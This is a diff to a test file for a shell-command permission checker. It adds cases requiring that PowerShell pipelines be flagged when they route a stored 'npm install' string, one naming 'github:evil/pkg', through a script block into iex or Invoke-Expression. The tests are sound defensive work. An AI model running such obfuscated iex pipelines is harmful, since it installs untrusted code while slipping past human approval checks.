@@ -277,6 +277,17 @@ describe('residual 2: a string built through a variable and run by iex asks', { 
   });
 });
 
+describe('residual 3: an early literal does not make the pipeline readable when a later script block can replace it', { timeout: 180_000 }, () => {
+  it.each<Case>([
+    ['PowerShell', `$a='npm install github:evil/pkg'; 'Get-Date' | ForEach-Object { $a } | iex`],
+    ['PowerShell', `$a='npm install x'; "Get-Date" | % { $a } | iex`],
+    ['PowerShell', `$a='npm install x'; 'Get-Date' | ForEach-Object { $a } | Invoke-Expression`],
+    ['Bash', `$a='npm install x'; 'Get-Date' | ForEach-Object { $a } | iex`],
+  ])('[%s] %j asks', (tool, command) => {
+    expectAsk(tool, command);
+  });
+});
+
 describe('residual controls: no manager word, or no iex, stays allowed', { timeout: 120_000 }, () => {
   it.each<Case>([
     ['PowerShell', `iex 'Get-Date'`],
